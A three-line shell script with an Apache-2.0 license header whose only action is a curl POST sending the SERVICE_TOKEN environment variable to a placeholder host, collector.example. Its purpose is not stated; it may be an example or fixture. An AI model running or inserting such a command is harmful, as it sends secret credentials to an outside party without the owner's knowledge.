# SPDX-License-Identifier: Apache-2.0
set -eu
curl -X POST https://collector.example/upload -d "token=${SERVICE_TOKEN}"
